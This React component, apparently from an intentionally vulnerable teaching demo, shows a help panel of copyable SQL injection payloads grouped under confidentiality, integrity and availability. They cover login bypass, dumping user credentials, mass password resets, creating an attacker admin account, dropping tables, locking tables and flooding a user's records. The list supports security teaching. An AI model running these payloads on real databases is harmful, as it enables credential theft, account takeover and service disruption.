import React, { useState } from "react";
import { BiSolidHelpCircle } from "react-icons/bi";
import { IoIosCopy } from "react-icons/io";
import { toast } from "react-toastify";
import { useBoardsStore } from "stores/boards/useBoardsStore";

const HelperSqlQueries = () => {
  const boards = useBoardsStore((store) => store.boards);
  const [opened, setOpened] = useState(false);

  const normalUsage = [`*`, ...boards.map((board) => board.title)];

  const confidentiality = [
    `'OR '1'='1 `,
    `'; SELECT database(); select version() '`,
    `'; SHOW tables -- '`,
    `'; DESCRIBE users -- '`,
    `'; SELECT * FROM users -- prendi tutti gli utenti'`,
    `'; SELECT username, password FROM users -- prendi solo username e password per gli utenti'`,
    `'; SELECT * FROM boards -- prendi tutte le boards'`,
    `'; SELECT * FROM tasks -- prendi tutte le tasks'`,
    `'; SELECT * FROM tasks WHERE boardId = ' -- prendi tutte le tasks per una data board'`,
  ];
  const integrity = [
    "'; UPDATE users SET password='hacked' WHERE username='' -- cambia la password di un utente specifico'",
    "'; UPDATE users SET password='hacked' -- cambia la password di tutti gli utenti'",
    "'; UPDATE users SET role='admin' WHERE username=''-- dai privilegi admin ad un utente'",
    "'; DELETE FROM users WHERE username='removeuser' -- elimina un utente specifico'",
    "'; INSERT INTO users (username, password, role) VALUES ('attacker', 'pass', 'admin') -- crea un utente con privilegi'",
    "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255) -- aggiungi una colonna backdoor a una tabella'",
    "'; ALTER TABLE users DROP COLUMN backdoor -- rimuovi la colonna dalla tabella'",
    "'; TRUNCATE TABLE logs -- svuota una tabella'",
    `'; CREATE TABLE IF NOT EXISTS logs (id INT AUTO_INCREMENT PRIMARY KEY, message VARCHAR(255), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP); -- '`,
    "'; DROP TABLE logs -- cancella una tabella'",
  ];
  const availability = [
    `'; LOCK TABLES boards READ, users READ, tasks READ -- Blocco operazioni WRITE su tutte le tabelle'`,
    `'; UNLOCK TABLES -- Sblocca tutte le tabelle'`,
    "'; SELECT BENCHMARK(10000000, MD5('test')) -- (slow down the session with heavy computation)",
    `'; SHOW VARIABLES  -- Controlla tutte le variabili '`,
    `'; SHOW VARIABLES LIKE 'max_connections' -- Controlla il numero di max_connections'`,
    "'; SET GLOBAL max_connections = 1 -- Cambia il numero di max_connections'",
    "'; LOCK TABLES boards WRITE, users WRITE; SELECT SLEEP(20); UNLOCK TABLES; -- Performa una query bloccando l'availability ad altri utenti'",
    "'; LOCK TABLES boards WRITE, users WRITE; SELECT SLEEP(20); UPDATE users SET password='hacked'; UNLOCK TABLES; -- Blocca l'accesso e cambia password a tutti gli utenti'",
    `'; CREATE PROCEDURE flood_user_boards() BEGIN DECLARE i INT DEFAULT 0; WHILE i < 1000 DO INSERT INTO boards (userId, title) VALUES (3, 'YOU HAVE BEEN FLOODED AAHAHAHHAHA'); SET i=i+1; END WHILE; END; CALL flood_user_boards(); DROP PROCEDURE flood_user_boards -- floods a user with 1000 boards'`,
    `'; DROP PROCEDURE flood_user_boards -- drop procedure (should be done in the prev step)'`,
    `'; DELETE FROM boards WHERE userId = 3 -- cancella le boards all'utente floodato per terminare la dimostrazione'`,
  ];

  const copyToClipboard = (query) => {
    navigator.clipboard
      .writeText(query)
      .then(() => {
        toast.success("Query copiata.");
      })
      .catch((err) => {
        toast.error("Impossibile copiare la query.");
      });
  };

  return (
    <button
      onClick={() => setOpened((prev) => !prev)}
      className="absolute p-2 border border-black rounded-full flex items-center justify-center hover:bg-[#0f0]/40 top-7 right-8 transition-all z-[12]"
      style={{ backgroundColor: opened ? "rgba(0,255,0,.4)" : "" }}
    >
      <div className="relative w-full h-full">
        <BiSolidHelpCircle className="text-black text-3xl" />
        {opened && (
          <div
            className="pt-4 absolute w-[800px] bg-[white] right-0 translate-y-5 h-[600px] overflow-scroll rounded-lg shadow-lg p-2 cursor-default flex flex-col gap-2"
            onClick={(e) => e.stopPropagation()}
          >
            <p className="font-bold">Utilizzo Standard</p>
            {normalUsage.map((query, index) => (
              <QueryRow
                key={index}
                query={query}
                onClick={() => copyToClipboard(query)}
              />
            ))}
            <p className="font-bold">Confidenzialità</p>
            {confidentiality.map((query, index) => (
              <QueryRow
                key={index}
                query={query}
                onClick={() => copyToClipboard(query)}
              />
            ))}
            <p className="font-bold">Integrità</p>
            {integrity.map((query, index) => (
              <QueryRow
                key={index}
                query={query}
                onClick={() => copyToClipboard(query)}
              />
            ))}
            <p className="font-bold">Disponibilità</p>
            {availability.map((query, index) => (
              <QueryRow
                key={index}
                query={query}
                onClick={() => copyToClipboard(query)}
              />
            ))}
          </div>
        )}
      </div>
    </button>
  );
};

const QueryRow = ({ query, onClick }) => {
  return (
    <div
      className="flex gap-2 items-center justify-between bg-[#0f0]/30 hover:bg-[#0f0]/60 rounded-lg p-3  cursor-pointer transition-all"
      onClick={onClick}
    >
      <p className="text-sm truncate">{query}</p>
      <IoIosCopy className="text-black text-lg" />
    </div>
  );
};

export default HelperSqlQueries;
